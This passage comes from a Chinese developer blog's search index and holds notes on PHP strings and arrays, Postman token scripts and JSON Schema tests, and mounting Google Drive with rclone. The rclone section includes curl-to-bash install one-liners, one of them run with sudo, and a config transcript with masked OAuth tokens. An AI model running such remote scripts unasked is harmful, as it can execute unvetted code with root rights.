class=\"string\">'Foo'</span>;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;bar = <span class=\"keyword\">array</span>(<span class=\"string\">'Bar1'</span>, <span class=\"string\">'Bar2'</span>, <span class=\"string\">'Bar3'</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$foo = <span class=\"keyword\">new</span> foo();</span><br><span class=\"line\">$name = <span class=\"string\">'MyName'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">&lt;&lt;&lt;'EOT'</span></span><br><span class=\"line\"><span class=\"string\">My name is \"<span class=\"subst\">$name</span>\". I am printing some <span class=\"subst\">$foo</span>-&gt;foo.</span></span><br><span class=\"line\"><span class=\"string\">Now, I am printing some <span class=\"subst\">&#123;$foo-&gt;bar[1]&#125;</span>.</span></span><br><span class=\"line\"><span class=\"string\">This should not print a capital 'A': \\x41</span></span><br><span class=\"line\"><span class=\"string\">EOT;</span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"echo-boolean-沒有東西原因\"><a href=\"#echo-boolean-沒有東西原因\" class=\"headerlink\" title=\"echo boolean 沒有東西原因\"></a>echo boolean 沒有東西原因</h3><p><a href=\"http://php.net/manual/zh/language.types.string.php#language.types.string.casting\" target=\"_blank\" rel=\"noopener\">PHP: String 字符串 - Manual</a></p>\n<p>之前不知道為什麼echo boolean沒有出來東西<br>現在知道為什麼了</p>\n<blockquote>\n<p>一個布爾值 boolean 的 TRUE 被轉換成 string 的 “1”。Boolean 的 FALSE 被轉換成 “”（空字符串）。這種轉換可以在 boolean 和 string 之間相互進行。<br>一個整數 integer 或浮點數 float 被轉換為數字的字面樣式的 string（包括 float 中的指數部分）。使用指數計數法的浮點數（4.1E+6<br>數組 array 總是轉換成字符串 “Array”，因此，echo 和 print 無法顯示出該數組的內容。要顯示某個單元，可以用 echo $arr[‘foo’] 這種結構。要顯示整個數組內容見下文。<br>在 PHP 4 中對象 object 總是被轉換成字符串 “Object”，如果為了調試原因需要打印出對象的值，請繼續閱讀下文。為了得到對象的類的名稱，可以用 get_class() 函數。自 PHP 5 起，適當時可以用 __toString 方法。<br>資源 resource 總會被轉變成 “Resource id #1” 這種結構的字符串，其中的 1 是 PHP 在運行時分配給該 resource 的唯一值。不要依賴此結構，可能會有變更。要得到一個 resource 的類型，可以用函數 get_resource_type()。<br>NULL 總是被轉變成空字符串。<br>如上面所說的，直接把 array，object 或 resource 轉換成 string 不會得到除了其類型之外的任何有用信息。可以使用函數 print_r() 和 var_dump() 列出這些類型的內容。 </p>\n</blockquote>\n<p><a href=\"http://php.net/manual/zh/language.types.string.php#language.types.string.casting\" target=\"_blank\" rel=\"noopener\">PHP: String 字符串 - Manual</a></p>\n<p>看來有空來補這個筆記<br><a href=\"http://php.net/manual/zh/language.types.type-juggling.php\" target=\"_blank\" rel=\"noopener\">PHP: 類型轉換的判別 - Manual</a></p>\n<p>還發現PHP String有長度限制<code>2GB</code></p>\n<p>結果原本要記錄一個東西，越記越多XD<br>發現很多書都沒有教很清楚orz</p>\n","categories":["PHP"],"tags":["PHP","String","HEREDOC","NOWDOC"]},{"title":"Postman 使用pre-request Script抓token範例","url":"/blog/2018/09/25/postman-%E4%BD%BF%E7%94%A8pre-request-Script%E6%8A%93token%E7%AF%84%E4%BE%8B/","content":"<p>最近同事使用postman抓資料，都需要抓取token所以都需要多一個步驟<br>所以我就找找有什麼可以不用一直做重複的事情<br>最後有用出來，但不常用這一定要做一下筆記<br><a id=\"more\"></a><br>首先，Postman有一個很重要的功能<a href=\"https://www.getpostman.com/docs/v6/postman/environments_and_globals/variables\" target=\"_blank\" rel=\"noopener\">Variables</a><br>這個變數可以方便設定<br>於是我在想有什麼方法可以透過Script幫我做抓token，然後設定到<code>變數</code>裡面去</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> client_id = <span class=\"string\">'xxxxx'</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> client_secret = <span class=\"string\">'OOOOOO'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> words = CryptoJS.enc.Utf8.parse(client_id + <span class=\"string\">':'</span> + client_secret);</span><br><span class=\"line\"><span class=\"keyword\">var</span> base64 = CryptoJS.enc.Base64.stringify(words);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">'Basic'</span> + base64);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">pm.sendRequest(&#123;</span><br><span class=\"line\">    url: <span class=\"string\">'https://xxxx.com'</span>,</span><br><span class=\"line\">    method: <span class=\"string\">'POST'</span>,</span><br><span class=\"line\">    header: <span class=\"string\">'Authorization: Basic '</span> + base64,</span><br><span class=\"line\">    body: &#123;</span><br><span class=\"line\">        mode: <span class=\"string\">'urlencoded'</span>,</span><br><span class=\"line\">            urlencoded: [</span><br><span class=\"line\">                    &#123; <span class=\"attr\">key</span>: <span class=\"string\">\"scope\"</span>, <span class=\"attr\">value</span>: <span class=\"string\">\"/main/v1\"</span>&#125;,</span><br><span class=\"line\">                    &#123; <span class=\"attr\">key</span>: <span class=\"string\">\"grant_type\"</span>, <span class=\"attr\">value</span>: <span class=\"string\">\"client_credentials\"</span> &#125;,</span><br><span class=\"line\">            ]</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">err, res</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(res.json());</span><br><span class=\"line\">    <span class=\"keyword\">var</span> token = res.json().access_token;</span><br><span class=\"line\">    </span><br><span class=\"line\">    pm.environment.set(<span class=\"string\">'token'</span>,<span class=\"string\">'Bearer '</span> + token);</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<img src=\"/blog/2018/09/25/postman-使用pre-request-Script抓token範例/1.jpg\" title=\"放code位置\">\n<h2 id=\"refresh-token\"><a href=\"#refresh-token\" class=\"headerlink\" title=\"refresh token\"></a>refresh token</h2><p><a href=\"https://codertw.com/%E5%89%8D%E7%AB%AF%E9%96%8B%E7%99%BC/2049/\" target=\"_blank\" rel=\"noopener\">Refresh Token的使用場景以及如何與JWT互動 | 程式前沿</a></p>\n","categories":["實用工具"],"tags":["postman"]},{"title":"php可以做陣列比較","url":"/blog/2018/06/24/php%E5%8F%AF%E4%BB%A5%E5%81%9A%E9%99%A3%E5%88%97%E6%AF%94%E8%BC%83/","content":"<p>今天無聊試著用array比較<br>發現竟然var_dump東西竟然是true</p>\n<p>依我印象中Java、JavaScript都不能直接做array比較<br>但是php竟然可以….<br>太神奇了</p>\n<a id=\"more\"></a>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">$a = <span class=\"keyword\">array</span>(<span class=\"keyword\">array</span>(<span class=\"string\">'a'</span>,<span class=\"string\">'b'</span>));</span><br><span class=\"line\">$b = <span class=\"keyword\">array</span>(<span class=\"keyword\">array</span>(<span class=\"string\">'a'</span>,<span class=\"string\">'b'</span>));</span><br><span class=\"line\">var_dump($a == $b );</span><br></pre></td></tr></table></figure>\n<img src=\"/blog/2018/06/24/php可以做陣列比較/array_operators.png\" title=\"array_operators\">\n<p>array也可以用+法，但是+到對印的value還是以左邊為主(本身)<br>其實自己測試會比較清楚</p>\n<blockquote>\n<p>The + operator returns the right-hand array appended to the left-hand array; for keys that exist in both arrays, the elements from the left-hand array will be used, and the matching elements from the right-hand array will be ignored.<br><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$a = <span class=\"keyword\">array</span>(<span class=\"string\">\"a\"</span> =&gt; <span class=\"string\">\"apple\"</span>, <span class=\"string\">\"b\"</span> =&gt; <span class=\"string\">\"banana\"</span>);</span><br><span class=\"line\">$b = <span class=\"keyword\">array</span>(<span class=\"string\">\"a\"</span> =&gt; <span class=\"string\">\"pear\"</span>, <span class=\"string\">\"b\"</span> =&gt; <span class=\"string\">\"strawberry\"</span>, <span class=\"string\">\"c\"</span> =&gt; <span class=\"string\">\"cherry\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">$c = $a + $b; <span class=\"comment\">// Union of $a and $b</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"Union of \\$a and \\$b: \\n\"</span>;</span><br><span class=\"line\">var_dump($c);</span><br><span class=\"line\"></span><br><span class=\"line\">$c = $b + $a; <span class=\"comment\">// Union of $b and $a</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"Union of \\$b and \\$a: \\n\"</span>;</span><br><span class=\"line\">var_dump($c);</span><br><span class=\"line\"></span><br><span class=\"line\">$a += $b; <span class=\"comment\">// Union of $a += $b is $a and $b</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"Union of \\$a += \\$b: \\n\"</span>;</span><br><span class=\"line\">var_dump($a);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure></p>\n</blockquote>\n<p>Union of $a and $b:<br>array(3) {<br>  [“a”]=&gt;<br>  string(5) “apple”<br>  [“b”]=&gt;<br>  string(6) “banana”<br>  [“c”]=&gt;<br>  string(6) “cherry”<br>}<br>Union of $b and $a:<br>array(3) {<br>  [“a”]=&gt;<br>  string(4) “pear”<br>  [“b”]=&gt;<br>  string(10) “strawberry”<br>  [“c”]=&gt;<br>  string(6) “cherry”<br>}<br>Union of $a += $b:<br>array(3) {<br>  ‘a’ =&gt;<br>  string(5) “apple”<br>  ‘b’ =&gt;<br>  string(6) “banana”<br>  ‘c’ =&gt;<br>  string(6) “cherry”<br>}</p>\n<p>array比較 === 跟 ==差別<br>在於===會檢查key順序<br><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">$a = <span class=\"keyword\">array</span> (<span class=\"number\">0</span> =&gt; <span class=\"string\">\"apple\"</span>, <span class=\"number\">1</span> =&gt; <span class=\"string\">\"banana\"</span>);</span><br><span class=\"line\">$b = <span class=\"keyword\">array</span> (<span class=\"number\">1</span> =&gt; <span class=\"string\">\"banana\"</span>, <span class=\"number\">0</span> =&gt; <span class=\"string\">\"apple\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">var_dump($a === $b); <span class=\"comment\">// prints bool(false) as well</span></span><br><span class=\"line\"></span><br><span class=\"line\">$b = <span class=\"keyword\">array</span> (<span class=\"string\">\"0\"</span> =&gt; <span class=\"string\">\"apple\"</span>, <span class=\"string\">\"1\"</span> =&gt; <span class=\"string\">\"banana\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">var_dump($a === $b); <span class=\"comment\">// prints bool(true)</span></span><br><span class=\"line\"></span><br><span class=\"line\">$b = <span class=\"keyword\">array</span> (<span class=\"string\">\"0\"</span> =&gt; <span class=\"string\">\"apple-1\"</span>, <span class=\"string\">\"1\"</span> =&gt; <span class=\"string\">\"banana-1\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">var_dump($a === $b); <span class=\"comment\">// prints bool(false)</span></span><br></pre></td></tr></table></figure></p>\n<p><a href=\"http://www.php.net/manual/en/language.operators.array.php\" target=\"_blank\" rel=\"noopener\">PHP: Array Operators - Manual</a><br><a href=\"https://stackoverflow.com/questions/5678959/php-check-if-two-arrays-are-equal\" target=\"_blank\" rel=\"noopener\">PHP - Check if two arrays are equal - Stack Overflow</a><br><a href=\"https://ithelp.ithome.com.tw/articles/10053754\" target=\"_blank\" rel=\"noopener\">PHP 三十天就上手-Day -17 Array Operators - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天</a></p>\n","categories":["PHP"],"tags":["php","array"]},{"title":"postman驗證JSON Schema方法","url":"/blog/2018/11/05/postman%E9%A9%97%E8%AD%89JSON-Schema%E6%96%B9%E6%B3%95/","content":"<p>最近在實作 API，發現上次只有做 VSCODE 檢查<br>postman 假如可以用的話，也很方便</p>\n<a id=\"more\"></a>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> schema = &#123;</span><br><span class=\"line\">    <span class=\"string\">\"$schema\"</span>: <span class=\"string\">\"http://json-schema.org/draft-06/schema#\"</span>,</span><br><span class=\"line\">        ......(略)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">pm.test(<span class=\"string\">\"Check JSON\"</span>, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> jsonData = pm.response.json();</span><br><span class=\"line\">  <span class=\"keyword\">var</span> valid = tv4.validate(jsonData, schema, <span class=\"literal\">false</span>, <span class=\"literal\">true</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (valid !== <span class=\"literal\">true</span>) &#123;</span><br><span class=\"line\">      <span class=\"built_in\">console</span>.log(tv4.error);</span><br><span class=\"line\">      tests[<span class=\"string\">'tv4.error:'</span> + tv4.error] = <span class=\"literal\">true</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  pm.expect(valid).to.be.true;</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<p>只要在<code>pre-test</code>放這段就可以檢查了</p>\n<p>參考來源:</p>\n<ul>\n<li><a href=\"https://stackoverflow.com/questions/48098530/how-do-i-test-json-schema-in-postman-using-tv4\" target=\"_blank\" rel=\"noopener\">How do I test JSON schema in postman using tv4? - Stack Overflow</a></li>\n<li><a href=\"https://stackoverflow.com/questions/31157675/debug-output-in-tests\" target=\"_blank\" rel=\"noopener\">javascript - Debug output in tests - Stack Overflow</a></li>\n</ul>\n<p>2018-11-07</p>\n<p>最近應為錯誤發現不會提示顯示哪裡錯誤<br>所以爬到<a href=\"https://stackoverflow.com/questions/48098530/how-do-i-test-json-schema-in-postman-using-tv4\" target=\"_blank\" rel=\"noopener\">How do I test JSON schema in postman using tv4? - Stack Overflow</a><br>修改一下程式碼</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\">pm.test(<span class=\"string\">\"Check JSON\"</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> jsonData = pm.response.json();</span><br><span class=\"line\">  <span class=\"keyword\">var</span> valid = tv4.validateMultiple(jsonData, schema, <span class=\"literal\">false</span>, <span class=\"literal\">true</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (valid.errors) &#123;</span><br><span class=\"line\">    valid.errors.forEach(</span><br><span class=\"line\">      (value, index) =&gt; (tests[value.schemaPath + <span class=\"string\">\":\"</span> + value.message] = <span class=\"literal\">true</span>)</span><br><span class=\"line\">    );</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  pm.expect(valid.errors.length === <span class=\"number\">0</span>).to.be.true;</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<p>最後，假如要用上次 VSCODE<br><code>setting.json</code>好像沒辦法自動設定所有 json 檔案<br><del>只能單一設定</del></p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"attr\">\"json.schemas\"</span>: [</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"attr\">\"fileMatch\"</span>: [<span class=\"string\">\"xxx.api.json\"</span>],</span><br><span class=\"line\">      <span class=\"attr\">\"url\"</span>: <span class=\"string\">\"./xxx.schema.json\"</span></span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"attr\">\"fileMatch\"</span>: [<span class=\"string\">\"oooo.json\"</span>],</span><br><span class=\"line\">      <span class=\"attr\">\"url\"</span>: <span class=\"string\">\"./oooo.schema.json\"</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  ]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><del>未來有找到好方法再補</del><br>有找到<a href=\"https://zhuanlan.zhihu.com/p/44967536\" target=\"_blank\" rel=\"noopener\">VSCode 配置文件的变量索引 - 知乎</a></p>\n<figure class=\"highlight\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  //不能使用</span><br><span class=\"line\">  \"json.schemas\": [</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"attr\">\"fileMatch\"</span>: [<span class=\"string\">\"$&#123;fileBasenameNoExtension&#125;.json\"</span>],</span><br><span class=\"line\">      <span class=\"attr\">\"url\"</span>: <span class=\"string\">\"./$&#123;fileBasenameNoExtension&#125;.schema.json\"</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  ]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><del>明天測試看能不能用</del></p>\n<p>2018-11-09<br>確定不能使用</p>\n<p>REST Client 好像沒有 JSON Schema 檢查工具</p>\n<p>一些 github 上檢驗工具<br><a href=\"https://github.com/ebdrup/json-schema-benchmark\" target=\"_blank\" rel=\"noopener\">ebdrup/json-schema-benchmark: Benchmarks for Node.js JSON-schema validators</a></p>\n<p>2019-05-22<br>另類檢查寫法</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> data = <span class=\"built_in\">JSON</span>.parse(responseBody);</span><br><span class=\"line\"></span><br><span class=\"line\">pm.test(<span class=\"string\">\"response must be valid and have a body\"</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// assert that the status code is 200</span></span><br><span class=\"line\">  pm.response.to.be.ok;</span><br><span class=\"line\">  <span class=\"comment\">// assert that the response has a valid JSON body</span></span><br><span class=\"line\">  pm.response.to.be.withBody;</span><br><span class=\"line\">  pm.response.to.be.json;</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">pm.test(<span class=\"string\">\"respnse body has xxxx ?\"</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  pm.expect(data.response.xxxx).is.not.empty;</span><br><span class=\"line\">  pm.response.to.not.have.jsonBody(<span class=\"string\">\"error\"</span>);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<p>參考來源:<br><a href=\"https://learning.getpostman.com/docs/postman/scripts/test_scripts/\" target=\"_blank\" rel=\"noopener\">Test scripts | Postman Learning Center</a></p>\n","categories":["實用工具"],"tags":["postman","json schema"]},{"title":"rclone 掛載硬碟小記","url":"/blog/2019/10/14/rclone-%E6%8E%9B%E8%BC%89%E7%A1%AC%E7%A2%9F%E5%B0%8F%E8%A8%98/","content":"<p>最近公司有用 gcsfuse 做硬碟掛載<br>突然想到之前有看到使用 rclone 的文章<br>今天就小式了一下</p>\n<a id=\"more\"></a>\n<h2 id=\"在-Window-掛載-rclone\"><a href=\"#在-Window-掛載-rclone\" class=\"headerlink\" title=\"在 Window 掛載 rclone\"></a>在 Window 掛載 rclone</h2><p>參考<a href=\"https://blog.rhilip.info/archives/874/\" target=\"_blank\" rel=\"noopener\">使用 rclone 在 Windows 下挂载 Google 个人 / 团队云盘 - R 酱小窝</a>實作</p>\n<h3 id=\"下載\"><a href=\"#下載\" class=\"headerlink\" title=\"下載\"></a>下載</h3><p>rclone ： <a href=\"https://rclone.org/downloads/\" target=\"_blank\" rel=\"noopener\">https://rclone.org/downloads/</a><br>winfsp ： <a href=\"http://www.secfs.net/winfsp/download/\" target=\"_blank\" rel=\"noopener\">http://www.secfs.net/winfsp/download/</a></p>\n<p><strong>winfsp</strong>一定要安裝，這個軟體跟掛載有關係</p>\n<h2 id=\"設定\"><a href=\"#設定\" class=\"headerlink\" title=\"設定\"></a>設定</h2><p><code>rclone config</code></p>\n<p>參考: <a href=\"https://ymgblog.com/2018/03/09/296/\" target=\"_blank\" rel=\"noopener\">Linux下rclone简单教程(支持VPS数据同步,多种网盘,支持挂载) | 半醉浮生丶</a><br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">root@arm1:~# rclone config</span><br><span class=\"line\">2018/06/12 15:36:43 NOTICE: Config file “/root/.config/rclone/rclone.conf” not found – using defaults</span><br><span class=\"line\">No remotes found – make a new one</span><br><span class=\"line\">n) New remote</span><br><span class=\"line\">s) Set configuration password</span><br><span class=\"line\">q) Quit config</span><br><span class=\"line\">n/s/q&gt; n       **********************选择 n，新建配置文件</span><br><span class=\"line\">name&gt; test       **********************输入配置的名称</span><br><span class=\"line\">Type of storage to configure.</span><br><span class=\"line\">Choose a number from below, or type in your own value</span><br><span class=\"line\">1 / Alias for a existing remote</span><br><span class=\"line\">\\ “alias”</span><br><span class=\"line\">2 / Amazon Drive</span><br><span class=\"line\">\\ “amazon cloud drive”</span><br><span class=\"line\">3 / Amazon S3 Compliant Storage Providers (AWS, Ceph, Dreamhost, IBM COS, Minio)</span><br><span class=\"line\">\\ “s3”</span><br><span class=\"line\">4 / Backblaze B2</span><br><span class=\"line\">\\ “b2”</span><br><span class=\"line\">5 / Box</span><br><span class=\"line\">\\ “box”</span><br><span class=\"line\">6 / Cache a remote</span><br><span class=\"line\">\\ “cache”</span><br><span class=\"line\">7 / Dropbox</span><br><span class=\"line\">\\ “dropbox”</span><br><span class=\"line\">8 / Encrypt/Decrypt a remote</span><br><span class=\"line\">\\ “crypt”</span><br><span class=\"line\">9 / FTP Connection</span><br><span class=\"line\">\\ “ftp”</span><br><span class=\"line\">10 / Google Cloud Storage (this is not Google Drive)</span><br><span class=\"line\">\\ “google cloud storage”</span><br><span class=\"line\">11 / Google Drive</span><br><span class=\"line\">\\ “drive”</span><br><span class=\"line\">12 / Hubic</span><br><span class=\"line\">\\ “hubic”</span><br><span class=\"line\">13 / Local Disk</span><br><span class=\"line\">\\ “local”</span><br><span class=\"line\">14 / Mega</span><br><span class=\"line\">\\ “mega”</span><br><span class=\"line\">15 / Microsoft Azure Blob Storage</span><br><span class=\"line\">\\ “azureblob”</span><br><span class=\"line\">16 / Microsoft OneDrive</span><br><span class=\"line\">\\ “onedrive”</span><br><span class=\"line\">17 / Openstack Swift (Rackspace Cloud Files, Memset Memstore, OVH)</span><br><span class=\"line\">\\ “swift”</span><br><span class=\"line\">18 / Pcloud</span><br><span class=\"line\">\\ “pcloud”</span><br><span class=\"line\">19 / QingCloud Object Storage</span><br><span class=\"line\">\\ “qingstor”</span><br><span class=\"line\">20 / SSH/SFTP Connection</span><br><span class=\"line\">\\ “sftp”</span><br><span class=\"line\">21 / Webdav</span><br><span class=\"line\">\\ “webdav”</span><br><span class=\"line\">22 / Yandex Disk</span><br><span class=\"line\">\\ “yandex”</span><br><span class=\"line\">23 / http Connection</span><br><span class=\"line\">\\ “http”</span><br><span class=\"line\">Storage&gt; 11       **********************这里是添加 googledrive 云盘，选择 11，当然你也可以添加其它云盘</span><br><span class=\"line\">Google Application Client Id – leave blank normally.</span><br><span class=\"line\">client_id&gt;       **********************回车留空即可</span><br><span class=\"line\">Google Application Client Secret – leave blank normally.</span><br><span class=\"line\">client_secret&gt;       **********************回车留空即可</span><br><span class=\"line\">Scope that rclone should use when requesting access from drive.</span><br><span class=\"line\">Choose a number from below, or type in your own value</span><br><span class=\"line\">1 / Full access all files, excluding Application Data Folder.</span><br><span class=\"line\">\\ “drive”</span><br><span class=\"line\">2 / Read-only access to file metadata and file contents.</span><br><span class=\"line\">\\ “drive.readonly”</span><br><span class=\"line\">/ Access to files created by rclone only.</span><br><span class=\"line\">3 | These are visible in the drive website.</span><br><span class=\"line\">| File authorization is revoked when the user deauthorizes the app.</span><br><span class=\"line\">\\ “drive.file”</span><br><span class=\"line\">/ Allows read and write access to the Application Data folder.</span><br><span class=\"line\">4 | This is not visible in the drive website.</span><br><span class=\"line\">\\ “drive.appfolder”</span><br><span class=\"line\">/ Allows read-only access to file metadata but</span><br><span class=\"line\">5 | does not allow any access to read or download file content.</span><br><span class=\"line\">\\ “drive.metadata.readonly”</span><br><span class=\"line\">scope&gt;       **********************回车留空即可，这里是云盘 API 权限的设置</span><br><span class=\"line\">ID of the root folder – leave blank normally. Fill in to access “Computers” folders. (see docs).</span><br><span class=\"line\">root_folder_id&gt;       **********************回车留空即可</span><br><span class=\"line\">Service Account Credentials JSON file path – leave blank normally.</span><br><span class=\"line\">Needed only if you want use SA instead of interactive login.</span><br><span class=\"line\">service_account_file&gt;</span><br><span class=\"line\">Remote config</span><br><span class=\"line\">Use auto config?</span><br><span class=\"line\">* Say Y if not sure</span><br><span class=\"line\">* Say N if you are working on a remote or headless machine or Y didn’t work</span><br><span class=\"line\">y) Yes</span><br><span class=\"line\">n) No</span><br><span class=\"line\">y/n&gt; n       **********************输入 n，手动配置</span><br><span class=\"line\">If your browser doesn’t open automatically go to the following link: https://accounts.google.com/o/oauth2/auth?access_type=offline&amp;client_id=20111111644.apps.googleusercontent.com&amp;redirect_uri=urn%3Aietf%3Awg%3Aoauth%3A2.0%3Aoob&amp;response_type=code&amp;scope=https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fdrive&amp;state=1111111111111111111111       **********************在本地打开这个链接，添加 google 云盘账号授予 rclone 权限</span><br><span class=\"line\">Log in and authorize rclone for access</span><br><span class=\"line\">Enter verification code&gt; 4/AAC8CPF21dYWqRnNSw479Fa8dUb11111111111111111111111111E       **********************输入在浏览器获取的认证 code</span><br><span class=\"line\">Configure this as a team drive?</span><br><span class=\"line\">y) Yes</span><br><span class=\"line\">n) No</span><br><span class=\"line\">y/n&gt; y       **********************是否团队云盘，我这里是，所以选择 Y</span><br><span class=\"line\">Fetching team drive list…</span><br><span class=\"line\">Choose a number from below, or type in your own value</span><br><span class=\"line\">1 / back</span><br><span class=\"line\">\\ “0AAbWF01111111111”</span><br><span class=\"line\">2 / back2</span><br><span class=\"line\">\\ “0ABf3gOL111111111”</span><br><span class=\"line\">Enter a Team Drive ID&gt; 1       **********************选择一个你要添加的团队云盘</span><br><span class=\"line\">——————–</span><br><span class=\"line\">[test]</span><br><span class=\"line\">type = drive</span><br><span class=\"line\">client_id =</span><br><span class=\"line\">client_secret =</span><br><span class=\"line\">scope =</span><br><span class=\"line\">root_folder_id =</span><br><span class=\"line\">service_account_file =</span><br><span class=\"line\">token = &#123;“access_token”:”ya29.GlvY1111qGBysX4tO_V5ZSO1PZ_Kq1111111111111111fksugvyOFC-MzvAPnl1rsi3OOwMFTdkk11111111H_u5zzPRp0eB_iLzKsZOVzP3R2ee1111AVmO”,”token_type”:”Bearer”,”refresh_token”:”1/r5Q_pH11111111CV-xiMne9_w62y_ag11bT_H9zz7qc”,”expiry”:”2018-06-12T16:37:16.714510063+08:00″&#125;</span><br><span class=\"line\">team_drive = 0AA11111111111111</span><br><span class=\"line\">——————–</span><br><span class=\"line\">y) Yes this is OK</span><br><span class=\"line\">e) Edit this remote</span><br><span class=\"line\">d) Delete this remote</span><br><span class=\"line\">y/e/d&gt; y       **********************输入 y，配置到这里就完成了</span><br><span class=\"line\">Current remotes:</span><br><span class=\"line\"></span><br><span class=\"line\">Name Type</span><br><span class=\"line\">==== ====</span><br><span class=\"line\">test drive</span><br><span class=\"line\"></span><br><span class=\"line\">e) Edit existing remote</span><br><span class=\"line\">n) New remote</span><br><span class=\"line\">d) Delete remote</span><br><span class=\"line\">r) Rename remote</span><br><span class=\"line\">c) Copy remote</span><br><span class=\"line\">s) Set configuration password</span><br><span class=\"line\">q) Quit config</span><br><span class=\"line\">e/n/d/r/c/s/q&gt; q       **********************输入 q 退出即可！</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"掛載\"><a href=\"#掛載\" class=\"headerlink\" title=\"掛載\"></a>掛載</h3><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">rclone mount gdrive:/ x: --cache-dir D:\\tmp --vfs-cache-mode writes</span><br><span class=\"line\"># git bash</span><br><span class=\"line\">rclone mount gdrive:/ x: --cache-dir /d/tmp --vfs-cache-mode writes</span><br></pre></td></tr></table></figure>\n<p>不知道為什麼我的 powershell 執行失敗…<br>但用 Git bash 就可以順力執行</p>\n<h3 id=\"GUI\"><a href=\"#GUI\" class=\"headerlink\" title=\"GUI\"></a>GUI</h3><p>另外，GUI 介面:<a href=\"https://github.com/kapitainsky/RcloneBrowser/releases\" target=\"_blank\" rel=\"noopener\">Releases · kapitainsky/RcloneBrowser</a><br>這個我就沒有試了</p>\n<h2 id=\"在-Raspberry-Pi-掛載\"><a href=\"#在-Raspberry-Pi-掛載\" class=\"headerlink\" title=\"在 Raspberry Pi 掛載\"></a>在 Raspberry Pi 掛載</h2><h3 id=\"安裝\"><a href=\"#安裝\" class=\"headerlink\" title=\"安裝\"></a>安裝</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># raspberry pi </span></span><br><span class=\"line\">curl -L https://raw.github.com/pageauc/rclone4pi/master/rclone-install.sh | bash</span><br><span class=\"line\"><span class=\"comment\"># normal(not raspberry pi)</span></span><br><span class=\"line\">curl https://rclone.org/install.sh | sudo bash</span><br></pre></td></tr></table></figure>\n<p>有看到<code>sudo apt install rclone</code>也可以使用，我沒有測試</p>\n<p>rclone config 就不再寫了，請看上面</p>\n<h3 id=\"掛載-1\"><a 